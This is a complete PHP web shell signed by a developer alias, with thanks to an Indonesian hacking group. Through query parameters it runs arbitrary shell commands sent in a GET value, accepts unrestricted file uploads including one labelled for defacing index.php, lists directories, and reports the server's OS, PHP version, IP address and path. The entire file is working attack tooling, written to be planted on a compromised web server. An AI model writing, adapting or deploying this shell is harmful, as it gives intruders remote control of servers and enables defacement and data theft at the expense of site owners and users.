<?php
# Dev: XDizzy25
# Programmer kok Recode :D
# Spesial thanks to IndoXploit - CodePolitan - Malasngoding - PetaniKode
if(isset($_GET['upload'])){
$namafile = $_FILES['anjay']['name'];
$namesem = $_FILES['anjay']['tmp_name'];
$lok = "./";
$upload = move_uploaded_file($namesem, $lok.$namafile);
echo "\033[1;32m[*]\033[1;37m Status : Uploaded \n";
echo "\033[1;32m[+]\033[1;37m File   : ".$namafile."\n";
}
if(isset($_GET['uwu'])){
	$lel = $_GET['uwu'];
	echo "".system($lel)."\n";
}
if(isset($_GET['dir'])){
	echo "".system("dir")."\n";
}
if(isset($_GET['ls'])){
	echo "".system("ls -la")."\n";
}
if(isset($_GET['jumpb'])){
	echo "".system("cd ..")."\n";
}
if(isset($_GET['site'])){
    $namafile = $_FILES['anjay']['name'];
    $namesem = $_FILES['anjay']['tmp_name'];
    $lok = "./";
    $upload = move_uploaded_file($namesem, $lok.$namafile);
    echo "\033[1;32m[*]\033[1;37m Success \n";
    echo "\033[1;37m    Deface file index.php \n";
}
if(isset($_GET['infos'])){
    $ea = phpversion();
    $a = php_uname();
    echo "\033[1;32m[*] \033[1;37mSystem     : ".$a."\n";
    echo "\033[1;32m[*] \033[1;37mPHP Version: ".$ea."\n";
    $e = getcwd();
    $eae = gethostbyname($_SERVER['HTTP_HOST']);
    echo "\033[1;32m[*] \033[1;37mIP Address : ".$eae."\n";
    echo "\033[1;32m[*] \033[1;37mPath       : ".$e."\n";
}
?>
